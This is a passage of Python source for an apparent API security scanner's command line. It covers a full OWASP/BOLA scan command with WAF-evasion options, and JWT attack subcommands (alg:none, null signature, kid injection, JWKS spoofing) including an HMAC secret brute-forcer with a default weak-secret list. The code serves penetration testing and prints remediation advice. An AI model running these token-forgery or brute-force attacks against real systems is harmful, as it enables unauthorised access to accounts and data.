@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--modules', help='Comma-separated list of OWASP modules to enable')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--depth', 'depth', type=int, default=None, callback=_validate_depth,
              help='Max recursion depth for discovery (0 = no recursion). '
                   'Overrides APILEAK_MAX_DEPTH and the config default (3).')
@click.option('--recursive/--no-recursive', 'recursive', default=None,
              help='Enable or disable recursive discovery (default: enabled).')
@click.option('--max-requests', 'max_requests', type=int, default=None, callback=_validate_max_requests,
              help='Global request budget for discovery (default: unbounded).')
@click.option('--concurrency', 'concurrency', type=int, default=None, callback=_validate_concurrency,
              help='Max concurrent in-flight discovery requests (default: 50).')
@click.option('--timeout', 'timeout', type=float, default=None, callback=_validate_timeout,
              help='Per-request timeout in seconds applied to every discovery request '
                   '(must be > 0; default: 10).')
@click.option('--retries', 'retries', type=int, default=None, callback=_validate_retries,
              help='Number of automatic retries for each failed discovery request '
                   '(must be >= 0; default: 2).')
@click.option('--extensions', '-x', 'extensions', multiple=True, metavar='EXT',
              help='File extensions to append to each wordlist entry (comma-separated, repeatable). '
                   'e.g. -x json,php or -x .json -x .php. Leading dots are optional.')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--auth-context', 'auth_context', multiple=True, metavar='user:token[:privilege]',
              help='Authenticated identity supplied as user:token with an optional '
                   ':privilege suffix. Repeatable: pass once per user to run multi-user '
                   'authorization tests (e.g. --auth-context alice:eyJ...:1 '
                   '--auth-context bob:eyJ...:1).')
@click.option('--public-key', 'public_key', metavar='PATH_OR_PEM',
              help='RSA public key material (PEM/DER path or inline PEM) used by the '
                   'algorithm-confusion test to HMAC-sign with the real key bytes.')
@click.option('--jwks-url', 'jwks_url', metavar='URL',
              help='JWKS endpoint URL used to fetch RSA public key material for the '
                   'algorithm-confusion test when no --public-key is supplied.')
@click.option('--signing-secret', 'signing_secret', metavar='SECRET',
              help='Known HMAC signing secret used to construct a validly-signed but '
                   'expired token for the expired-token-acceptance test.')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection (FastAPI, Express, Django, Flask, etc.)')
@click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing (/v1, /v2, /api/v1, etc.)')
@click.option('--framework-confidence', type=float, default=0.6, help='Minimum confidence threshold for framework detection (0.0-1.0)')
@click.option('--version-patterns', help='Custom version patterns for fuzzing (comma-separated, e.g., /v1,/v2,/api/v1)')
@click.option('--enable-advanced', is_flag=True, help='Enable all advanced features (framework detection, version fuzzing, subdomain discovery, CORS analysis)')
@click.option('--enable-payload-encoding', is_flag=True, help='Enable advanced payload encoding and obfuscation techniques')
@click.option('--enable-waf-evasion', is_flag=True, help='Enable WAF detection and evasion techniques')
@click.option('--enable-subdomain-discovery', is_flag=True, help='Enable subdomain discovery and testing')
@click.option('--enable-cors-analysis', is_flag=True, help='Enable CORS policy analysis and security headers testing')
@click.option('--ci-mode', is_flag=True, help='Enable CI/CD mode with appropriate exit codes and artifact generation')
@click.option('--fail-on', type=click.Choice(['critical', 'high', 'medium', 'low']), 
              default='critical', help='Fail CI pipeline on findings of this severity or higher')
@click.option('--sarif', is_flag=True, help='Generate a SARIF 2.1.0 report (for code scanning / CI integration)')
@click.option('--safe-mode', is_flag=True, help='Enable Safe Mode: skip state-changing probes (POST/PUT/PATCH/DELETE) and restrict requests to safe methods (non-destructive scan)')
@click.option('--baseline', type=click.Path(), help='Path to a baseline JSON report. Findings matching the baseline by (category, endpoint, method) are treated as known; only new findings drive the CI severity gate. A missing path treats every finding as new.')
@click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets.')
@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
@click.option('--recursion-status', 'recursion_status', metavar='CLASSES', default=None,
              help='Restrict recursion to endpoints whose status class is in CLASSES: a '
                   "comma-separated list of status classes like '2xx,3xx'. Only narrows the "
                   'default VALID/AUTH_REQUIRED recursion; never relaxes it.')
@click.option('--recursion-type', 'recursion_type', metavar='TYPES', default=None,
              help='Restrict recursion to endpoints whose type is in TYPES: a comma-separated '
                   "list of endpoint types like 'admin,api_version'. Only narrows the default "
                   'recursion; never relaxes it.')
@click.option('--allow-write-bola', 'allow_write_bola', is_flag=True, default=False,
              help='Destructive_Opt_In: authorize the BOLA module to issue destructive '
                   '(state-changing) probes. Off by default; when omitted the BOLA module '
                   'issues only safe-method probes (read-only).')
@click.option('--bola-destructive-methods', 'bola_destructive_methods', metavar='METHODS', default=None,
              help='Comma-separated HTTP methods treated as destructive when '
                   '--allow-write-bola is set (e.g. PATCH,PUT,DELETE). Values are '
                   'uppercased. Defaults to PATCH,PUT (DELETE excluded) when omitted.')
@click.option('--bola-composite', 'bola_composite', is_flag=True, default=False,
              help='Enable the composite-key BOLA probe (off by default).')
@click.option('--bola-id-leakage', 'bola_id_leakage', is_flag=True, default=False,
              help='Enable the object-identifier leakage BOLA probe (off by default).')
@click.option('--bola-verb-tampering', 'bola_verb_tampering', is_flag=True, default=False,
              help='Enable the HTTP verb-tampering BOLA technique (off by default).')
@click.option('--bola-parameter-pollution', 'bola_parameter_pollution', is_flag=True, default=False,
              help='Enable the HTTP parameter-pollution BOLA technique (off by default).')
@click.option('--bola-dry-run', 'bola_dry_run', is_flag=True, default=False,
              help='Plan destructive BOLA probes (method, URL, substituted id, body) '
                   'without issuing them (off by default).')
@click.pass_context
def full(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit, depth, recursive, max_requests, concurrency, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, auth_context, public_key, jwks_url, signing_secret, status_code, detect_framework, fuzz_versions, framework_confidence, version_patterns, enable_advanced, enable_payload_encoding, enable_waf_evasion, enable_subdomain_discovery, enable_cors_analysis, ci_mode, fail_on, sarif, safe_mode, baseline, proxy, proxy_verify_ssl, recursion_status, recursion_type, allow_write_bola, bola_destructive_methods, bola_composite, bola_id_leakage, bola_verb_tampering, bola_parameter_pollution, bola_dry_run):
    """Full comprehensive scan - includes fuzzing and OWASP testing
    
    \b
    Examples:
      python apileaks.py full --target https://api.example.com
      python apileaks.py full --config config.yaml --target URL
      python apileaks.py full --target URL --modules bola,auth,property
      python apileaks.py full --target URL --enable-advanced --jwt TOKEN
      python apileaks.py full --target URL --ci-mode --fail-on critical
    """
    
    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
    
    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("full")
    
    logger.info("APILeak full scan starting", version="0.1.0", ci_mode=ci_mode)

    # Parse the repeatable --auth-context option up front so a value missing the
    # ':' separator is rejected with a descriptive click.BadParameter BEFORE any
    # discovery or request is issued (Requirement 20.5). An empty option yields
    # an empty list, preserving the existing single-`--jwt` behavior
    # (Requirements 20.4, 26.2).
    parsed_auth_contexts = parse_auth_context_option(auth_context)

    # Parse the Recursion_Scope up front so an unrecognized status class or
    # endpoint type is surfaced as a descriptive CLI error naming the offending
    # value and NO Endpoint_Discovery is performed (Requirements 34.1, 34.2,
    # 34.8). This runs before the scan's try/except so the abort is explicit and
    # is not swallowed by the broad failure handler below.
    try:
        recursion_scope = parse_recursion_scope(recursion_status, recursion_type)
    except RecursionScopeError as exc:
        logger.error("Invalid discovery scope value", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)

    try:
        config_manager = ConfigurationManager()
        
        if config:
            # Load configuration from file
            apileak_config = config_manager.load_config(config)
        else:
            # Create default configuration for full scan
            if not target:
                click.echo("Error: --target is required when no config file is provided", err=True)
                sys.exit(1)
            
            # Prepare user agent configuration
            user_agent_config = None
            if user_agent_random:
                user_agent_config = {'random': True}
            elif user_agent_custom:
                user_agent_config = {'custom': user_agent_custom}
            elif user_agent_file:
                user_agents = load_user_agents_from_file(user_agent_file)
                user_agent_config = {'file_list': user_agents}
            
            # Prepare output filename
            output_filename = prepare_output_filename(output)
            
            # Prepare advanced configuration with enhanced options
            advanced_config = {
                'detect_framework': detect_framework or enable_advanced,
                'fuzz_versions': fuzz_versions or enable_advanced,
                'framework_confidence': framework_confidence,
                'enable_payload_encoding': enable_payload_encoding or enable_advanced,
                'enable_waf_evasion': enable_waf_evasion or enable_advanced,
                'enable_subdomain_discovery': enable_subdomain_discovery or enable_advanced,
                'enable_cors_analysis': enable_cors_analysis or enable_advanced
            }
            
            # Parse custom version patterns if provided
            if version_patterns:
                custom_patterns = [p.strip() for p in version_patterns.split(',')]
                advanced_config['version_patterns'] = custom_patterns
            
            # Parse status code filter for HTTP output
            status_code_filter = parse_status_codes(status_code) if status_code else None

            # Assemble advanced BOLA hardening options (Requirement 34) from the
            # CLI flags so they populate the constructed BOLAConfig via
            # create_enhanced_config -> owasp_testing.bola_testing. All boolean
            # flags default to off (False); --bola-destructive-methods is parsed
            # from a comma-separated string into an uppercased set and is only
            # threaded when supplied so the BOLAConfig default {PATCH, PUT}
            # otherwise applies (Requirements 34.3, 34.4).
            destructive_methods_set = None
            if bola_destructive_methods:
                destructive_methods_set = {
                    m.strip().upper()
                    for m in bola_destructive_methods.split(',')
                    if m.strip()
                }
            bola_config = {
                'allow_destructive': allow_write_bola,
                'destructive_methods': destructive_methods_set,
                'enable_composite': bola_composite,
                'enable_id_leakage': bola_id_leakage,
                'verb_tampering': bola_verb_tampering,
                'parameter_pollution': bola_parameter_pollution,
                'dry_run': bola_dry_run,
            }

            config_dict = create_enhanced_config(target, None, "full", user_agent_config, output_filename, advanced_config, status_code_filter, ci_mode, fail_on, safe_mode, bola_config=bola_config)
            # Thread discovery recursion / budget / concurrency controls into the
            # fuzzing config (Requirements 17, 18, 20).
            config_dict['fuzzing']['max_depth'] = resolve_max_depth(depth)
            if recursive is not None:
                config_dict['fuzzing']['recursive'] = recursive
            if max_requests is not None:
                config_dict['fuzzing']['max_requests'] = max_requests
            if concurrency is not None:
                config_dict['fuzzing']['concurrency'] = concurrency
            # Thread the per-request resilience controls into the config
            # (Requirement 28). --timeout becomes the target read timeout consumed
            # by HTTPRequestEngine (28.1); --retries becomes the Retry_Limit sourced
            # into RetryConfig.max_attempts (28.2). Both fall back to the config
            # defaults when not supplied.
            if timeout is not None:
                config_dict['target']['timeout'] = timeout
            if retries is not None:
                config_dict['fuzzing']['retries'] = retries
            # Thread the Extension_Set into the fuzzing config (Requirement 23.1).
            # Values are comma-separated AND repeatable: split each value on
            # commas, flatten, then normalize to canonical single-dot form.
            config_dict['fuzzing'].setdefault('endpoints', {})
            config_dict['fuzzing']['endpoints']['extensions'] = normalize_extensions(
                [ext for value in extensions for ext in value.split(',')]
            )
            if depth == 0:
                config_dict['fuzzing']['recursive'] = False  # depth 0 => depth-0 pass only (17.3)
            # Thread the Recursion_Scope onto the fuzzing config so recursion only
            # descends into records the scope admits (Requirements 34.1-34.3).
            # None (no flags) preserves the default VALID/AUTH_REQUIRED recursion
            # (34.4).
            config_dict['fuzzing']['recursion_scope'] = recursion_scope
            apileak_config = config_manager.load_config_from_dict(config_dict)
        
        # When --safe-mode is requested, ensure it is honored even when the
        # configuration was loaded from a file (CLI flag overrides config).
        if safe_mode and hasattr(apileak_config, 'safe_mode'):
            apileak_config.safe_mode = True

        # When --proxy is requested, route all traffic through the intercepting
        # proxy (Burp/Caido/Hetty). The CLI flag overrides any file config and
        # applies whether the config came from a file or was built in-memory.
        if proxy and hasattr(apileak_config, 'proxy'):
            apileak_config.proxy = proxy
            apileak_config.proxy_verify_ssl = proxy_verify_ssl
        
        # When --sarif is requested, ensure the SARIF format is included in the
        # effective reporting formats so a *.sarif report is generated.
        if sarif and hasattr(apileak_config, 'reporting'):
            if 'sarif' not in apileak_config.reporting.formats:
                apileak_config.reporting.formats.append('sarif')

        # Thread the parsed multi-user Auth_Contexts into the authentication
        # config so all of them are passed to the OWASP modules (Requirements
        # 20.1, 20.2). Each supplied --auth-context becomes one AuthContext with
        # its privilege_level set from the optional :privilege suffix (Req 20.3).
        # The contexts are appended to the existing anonymous context so
        # discovery and the single-`--jwt` behavior are preserved (Reqs 20.4,
        # 26.2). Applied post-load so it works for both file and in-memory
        # configs.
        if parsed_auth_contexts and hasattr(apileak_config, 'authentication'):
            apileak_config.authentication.contexts.extend(parsed_auth_contexts)
            logger.info(
                "Threaded multi-user auth contexts into OWASP modules",
                context_count=len(parsed_auth_contexts),
            )

        # Thread the algorithm-confusion / expired-token key inputs into the
        # AuthTestingConfig so the Auth_Module can source real key material
        # instead of literal placeholders (Requirements 6.1, 6.2, 8.1). The CLI
        # flags override any file-config values when supplied.
        if hasattr(apileak_config, 'owasp_testing') and hasattr(
                apileak_config.owasp_testing, 'auth_testing'):
            auth_testing_cfg = apileak_config.owasp_testing.auth_testing
            if public_key:
                auth_testing_cfg.public_key_material = public_key
            if jwks_url:
                auth_testing_cfg.jwks_url = jwks_url
            if signing_secret:
                auth_testing_cfg.signing_secret = signing_secret

        # Apply CLI overrides
        cli_overrides = {}
        if target:
            cli_overrides['target_url'] = target
        if rate_limit:
            cli_overrides['rate_limit'] = rate_limit
        if modules:
            cli_overrides['modules'] = [m.strip() for m in modules.split(',')]
        if jwt:
            cli_overrides['jwt_token'] = jwt
        
        if cli_overrides:
            config_manager.merge_cli_overrides(cli_overrides)
        
        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)
        
        # Run the enhanced scan
        asyncio.run(run_enhanced_apileak(apileak_config, ci_mode, fail_on, baseline))
        
    except Exception as e:
        logger.error("Full scan failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


# ---------------------------------------------------------------------------
# JWT CLI helpers — route all attack-token generation and execution through the
# single-source-of-truth JWTAttackEngine (Requirements 14.2, 14.3) and issue
# HTTP through the shared HTTPRequestEngine (Requirement 17.1). No subcommand
# reimplements attack logic inline, and success is decided by the engine's
# JWTAttackResponseAnalyzer rather than admin/dashboard keyword presence
# (Requirement 19.2).
# ---------------------------------------------------------------------------

def _parse_custom_headers(header):
    """Parse repeatable ``Name: Value`` header options into a dict.

    Exits with an error on a malformed header, matching prior CLI behavior.
    """
    custom_headers = {}
    for h in header:
        if ':' not in h:
            click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
            sys.exit(1)
        name, value = h.split(':', 1)
        custom_headers[name.strip()] = value.strip()
    return custom_headers


def _build_jwt_http_engine(timeout=30, verify_ssl=True):
    """Build a shared :class:`HTTPRequestEngine` for JWT attack requests.

    Routing JWT HTTP through the shared engine applies the same rate limiting,
    proxy, User-Agent rotation, and TLS controls as the rest of the tool
    (Requirement 17.1).
    """
    from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig
    from core.config import RateLimitConfig

    rate_limiter = RateLimiter(RateLimitConfig())
    retry_config = RetryConfig(max_attempts=3)
    return HTTPRequestEngine(
        rate_limiter, retry_config, timeout=timeout, verify_ssl=verify_ssl)


def _make_jwt_engine(token, url, custom_headers, data, http_engine=None,
                     signing_secret=None):
    """Construct a :class:`JWTAttackEngine` for a CLI subcommand."""
    return JWTAttackEngine(
        target_url=url or "",
        original_token=token,
        http_engine=http_engine,
        signing_secret=signing_secret,
        custom_headers=custom_headers or {},
        post_data=data,
    )


def _display_generated_tokens(engine, attack_type):
    """Generate and print attack tokens for ``attack_type`` via the engine."""
    tokens = engine.generate_token(attack_type)
    click.echo(f"\n🎯 Generated {len(tokens)} attack token(s) via JWTAttackEngine:")
    click.echo("-" * 55)
    for i, tok in enumerate(tokens, 1):
        click.echo(f"\n{i}. {tok}")
    return tokens


def _report_attack_result(result):
    """Report a single :class:`AttackResult` using the analyzer's assessment.

    Success is determined by the engine's :class:`JWTAttackResponseAnalyzer`
    (baseline comparison + confidence scoring), never by keyword presence
    (Requirements 19.1, 19.2).
    """
    if result is None:
        click.echo("   ⚠️  No response obtained from the endpoint for this vector")
        return False

    assessment = result.vulnerability_assessment
    response = result.response_details
    click.echo(f"\n🧪 {result.attack_type.value}:")
    click.echo(f"   Status: {response.status_code}")
    click.echo(f"   Length: {response.content_length} bytes")
    click.echo(f"   Confidence: {assessment.confidence_score:.2f}")
    if result.baseline_comparison:
        bc = result.baseline_comparison
        click.echo(
            f"   Baseline: {bc.get('baseline_status')} -> {bc.get('attack_status')} "
            f"(len Δ {bc.get('content_length_diff')})")

    if assessment.is_vulnerable:
        click.echo(f"   🚨 VULNERABILITY CONFIRMED: {assessment.vulnerability_type} "
                   f"({assessment.severity.value})")
        for ev in assessment.evidence:
            click.echo(f"   💀 {ev}")
        return True

    click.echo("   ✅ Attack blocked - server rejected the malicious token")
    return False


def _run_jwt_vector(token, attack_type, url, custom_headers, data, timeout,
                    verify_ssl=True, signing_secret=None):
    """Drive one JWT attack vector through the engine.

    When ``url`` is provided the vector is executed against the endpoint through
    the shared :class:`HTTPRequestEngine` and evaluated by the engine's response
    analyzer; otherwise the generated tokens are displayed for manual testing.
    """
    if not url:
        engine = _make_jwt_engine(token, url, custom_headers, data)
        _display_generated_tokens(engine, attack_type)
        click.echo(f"\n⚠️  Manual Testing Required (no --url provided):")
        click.echo("• Test each generated token against your API endpoints")
        click.echo("• If a token is accepted, the server is vulnerable to this attack")
        return

    async def _run():
        http_engine = _build_jwt_http_engine(timeout, verify_ssl)
        try:
            engine = _make_jwt_engine(
                token, url, custom_headers, data,
                http_engine=http_engine, signing_secret=signing_secret)
            _display_generated_tokens(engine, attack_type)
            click.echo(f"\n🎯 Testing against endpoint: {url}")
            result = await engine.execute_attack(attack_type)
            _report_attack_result(result)
        finally:
            await http_engine.close()

    asyncio.run(_run())


# JWT Command Group
@cli.group()
@click.pass_context
def jwt(ctx):
    """JWT utilities - decode, encode, and security vulnerability testing
    
    \b
    JWT Security Testing includes:
    • Token decoding and analysis
    • Custom token generation
    • Algorithm confusion attacks (alg:none, null signature)
    • Weak HMAC secret brute-force
    • Key ID (kid) injection attacks
    • JWKS spoofing and inline injection
    • Comprehensive attack testing against live endpoints
    • Blank password signature acceptance
    
    \b
    Basic Examples:
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
      python apileaks.py jwt test-alg-none TOKEN
      python apileaks.py jwt brute-secret TOKEN --wordlist secrets.txt
    
    \b
    Comprehensive Attack Testing:
      python apileaks.py jwt attack-test TOKEN --url https://api.example.com/protected
      python apileaks.py jwt attack-test TOKEN -u URL -H "X-API-Key: key123"
      python apileaks.py jwt attack-test TOKEN -u URL -d '{"action":"read"}'
    
    \b
    Available Commands:
      decode              Decode and analyze JWT tokens
      encode              Create JWT tokens with custom payloads
      test-alg-none       Test algorithm confusion (alg:none) attacks
      test-null-signature Test null signature bypass attacks
      brute-secret        Brute-force weak HMAC secrets
      test-kid-injection  Test Key ID (kid) injection vulnerabilities
      test-jwks-spoof     Test JWKS URL spoofing attacks
      test-inline-jwks    Test inline JWKS injection attacks
      attack-test         Comprehensive automated attack testing (NEW)
    
    Use 'python apileaks.py jwt COMMAND --help' for detailed help on any command.
    """
    pass


@jwt.command('decode')
@click.argument('token')
@click.pass_context
def jwt_decode_cmd(ctx, token):
    """Decode and analyze a JWT token
    
    \b
    Example:
      python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
    """
    try:
        decoded = decode_jwt(token)
        print_jwt_info(decoded)
        
        # Also output as JSON for programmatic use
        click.echo("\n📄 JSON Output:")
        click.echo("-" * 20)
        click.echo(json.dumps({
            'header': decoded['header'],
            'payload': decoded['payload'],
            'signature': decoded['signature']
        }, indent=2))
        
    except ValueError as e:
        click.echo(f"❌ Error decoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('encode')
@click.argument('payload')
@click.option('--header', default='{"alg":"HS256","typ":"JWT"}', help='JWT header as JSON string')
@click.option('--secret', default='secret', help='Secret key for signing (default: "secret")')
@click.pass_context
def jwt_encode_cmd(ctx, payload, header, secret):
    """Encode a JWT token with custom payload and header
    
    \b
    Examples:
      python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
      python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
    """
    try:
        # Parse JSON strings
        try:
            header_dict = json.loads(header)
        except json.JSONDecodeError:
            click.echo("❌ Error: Header must be valid JSON", err=True)
            sys.exit(1)
        
        try:
            payload_dict = json.loads(payload)
        except json.JSONDecodeError:
            click.echo("❌ Error: Payload must be valid JSON", err=True)
            sys.exit(1)
        
        # Encode JWT
        token = encode_jwt(header_dict, payload_dict, secret)
        
        click.echo("\n" + "="*60)
        click.echo("JWT Token Generated")
        click.echo("="*60)
        click.echo(f"\n🔑 Secret Used: {secret}")
        click.echo(f"📋 Header: {json.dumps(header_dict)}")
        click.echo(f"🔐 Payload: {json.dumps(payload_dict)}")
        click.echo(f"\n🎫 Generated Token:")
        click.echo("-" * 20)
        click.echo(token)
        click.echo("\n" + "="*60)
        
    except ValueError as e:
        click.echo(f"❌ Error encoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-alg-none')
@click.argument('token')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test alg:none attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_alg_none(ctx, token, payload, url, header, data, timeout):
    """Test algorithm confusion attack with alg:none
    
    \b
    🧪 CRITICAL SEVERITY ATTACK
    Algorithm confusion - completely nullifies authentication by:
    
    1️⃣ Rewriting header: "alg": "none"\b
    2️⃣ Removing signature completely\b
    3️⃣ Inserting malicious payload\b
    4️⃣ Sending unsigned token\b
    5️⃣ Testing privileged access

    
    \b
    Examples:
      # Basic alg:none test
      python apileaks.py jwt test-alg-none TOKEN
      
      # Test with custom admin payload
      python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'
      
      # Test against real endpoint
      python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
    """
    try:
        click.echo("🔍 Algorithm Confusion Attack (alg:none)")
        click.echo("="*45)
        click.echo("🔥 SEVERITY: CRITICAL - Authentication Completely Nullified")
        click.echo("")

        custom_headers = _parse_custom_headers(header)

        # Decode original token for display
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). If a custom payload is supplied
        # it is merged onto the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.ALG_NONE, url, custom_headers,
                        data, timeout)

        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Configure JWT library to REJECT alg:none tokens")
        click.echo("• Implement algorithm whitelist (e.g., only allow HS256, RS256)")
        click.echo("• Never trust the algorithm specified in JWT header")
        click.echo("• Use proper JWT validation libraries, not custom implementations")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-null-signature')
@click.argument('token')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test null signature attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
    """Test null signature vulnerability
    
    \b
    🧾 CRITICAL SEVERITY ATTACK
    Null/empty signature acceptance - cryptographic validation bypass by:
    
    1️⃣ Sending JWT with empty signature: header.payload.\b
    2️⃣ Inserting admin payload\b
    3️⃣ Testing against protected endpoint\b
    4️⃣ Confirming bypass of signature validation
    
    \b
    Examples:
      # Basic null signature test
      python apileaks.py jwt test-null-signature TOKEN
      
      # Test with custom admin payload
      python apileaks.py jwt test-null-signature TOKEN --payload '{"sub":"admin","admin":true}'
      
      # Test against real endpoint
      python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Null Signature Vulnerability Test")
        click.echo("="*40)
        click.echo("🔥 SEVERITY: CRITICAL - Cryptographic Validation Bypass")
        click.echo("")

        custom_headers = _parse_custom_headers(header)

        # Decode original token for display
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). A custom payload is merged onto
        # the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.NULL_SIGNATURE, url, custom_headers,
                        data, timeout)

        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Implement proper signature validation - never accept empty signatures")
        click.echo("• Validate signature length and format before verification")
        click.echo("• Use established JWT libraries with proper validation")
        click.echo("• Implement signature presence checks before cryptographic verification")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('brute-secret')
@click.argument('token')
@click.option('--wordlist', '-w', default='wordlists/jwt_secrets.txt', help='Wordlist file for secret brute-force')
@click.option('--max-attempts', default=1000, help='Maximum brute-force attempts')
@click.option('--url', '-u', help='Target URL to test recovered secret against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, timeout):
    """Brute-force weak HMAC secrets and test exploitation
    
    \b
    🔐 CRITICAL SEVERITY ATTACK
    This attack attempts to crack JWT HMAC secrets and demonstrates
    complete authentication compromise by:
    
    1️⃣ Confirming JWT uses HS* algorithm\b
    2️⃣ Executing brute-force/dictionary attack\b
    3️⃣ Recovering the real secret\b
    4️⃣ Forging new JWT with modified claims\b
    5️⃣ Testing real API access with forged token\b

    
    \b
    Examples:
      # Basic secret brute-force
      python apileaks.py jwt brute-secret TOKEN
      
      # Test exploitation against real endpoint
      python apileaks.py jwt brute-secret TOKEN --url https://api.example.com/admin
      
      # Full exploitation test with custom headers
      python apileaks.py jwt brute-secret TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 JWT HMAC Secret Brute-Force Attack")
        click.echo("="*45)
        click.echo("🔥 SEVERITY: CRITICAL - Complete Authentication Compromise")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Check if wordlist exists
        if not Path(wordlist).exists():
            click.echo(f"❌ Wordlist not found: {wordlist}")
            click.echo("Creating default wordlist...")
            
            # Create default wordlist
            Path(wordlist).parent.mkdir(exist_ok=True)
            default_secrets = [
                "secret", "password", "123456", "admin", "jwt_secret",
                "your_secret_key", "mysecret", "key", "token", "auth",
                "api_key", "private_key", "hmac_secret", "signing_key",
                "jwt_key", "access_token", "refresh_token", "session_key",
                "", "null", "undefined", "test", "dev", "development",
                "prod", "production", "staging", "demo", "example"
            ]
            
            with open(wordlist, 'w') as f:
                for secret in default_secrets:
                    f.write(f"{secret}\n")
            
            click.echo(f"✅ Created default wordlist: {wordlist}")
        
        # Load secrets from wordlist
        with open(wordlist, 'r') as f:
            secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Decode token to get header and payload
        decoded = decode_jwt(token)

        # 1️⃣ Confirm JWT uses HS* algorithm
        algorithm = decoded['header'].get('alg', '').upper()
        if not algorithm.startswith('HS'):
            click.echo(f"⚠️  WARNING: Token uses {algorithm} algorithm, not HMAC")
            click.echo("   This attack only works against HS256, HS384, HS512")
            if not click.confirm("Continue anyway?"):
                return

        click.echo(f"✅ Target algorithm: {algorithm}")
        click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
        click.echo("")

